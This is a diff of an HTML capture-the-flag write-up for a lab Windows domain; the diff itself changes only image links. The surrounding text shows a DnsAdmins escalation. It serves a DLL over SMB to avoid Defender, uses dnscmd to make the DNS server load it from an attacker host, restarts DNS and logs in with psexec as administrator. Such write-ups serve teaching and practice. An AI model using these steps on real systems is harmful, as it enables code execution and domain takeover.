@@ -346,12 +346,12 @@ Everyone                                   Well-known <span class="hljs-keyword"
 <p>We can transfer it using smb, not to trigger Windows Defender.</p>
 <p><code>sudo /home/user/vpy/bin/smbserver.py share ./</code></p>
 <p>Then make the server load our dll on boot by running <code>cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.21\share\da.dll</code>as ryan on victim machine.</p>
-<p><img src="/_resources/c195a3d5f7fa4cb79f3f69cebac45976.png" /></p>
+<p><img src=":/c195a3d5f7fa4cb79f3f69cebac45976" alt="7102a0e7eec2901448086b54ef646b41.png" /></p>
 <p>Finally, we restart the dns.</p>
 <div><pre class="hljs"><code>sc.exe stop dns
 sc.exe <span class="hljs-built_in">start</span> dns</code></pre></div>
 <p>Then we get in using <code>python3 psexec.py megabank.local/administrator@10.129.223.63</code></p>
-<p><img src="/_resources/22cb106ffaf3487e8ece02add94fe884.png" /></p>
+<p><img src=":/22cb106ffaf3487e8ece02add94fe884" alt="2e6240a3e8a76134ffc459244c4b14d7.png" /></p>
 </div>
       </article>
     </div>
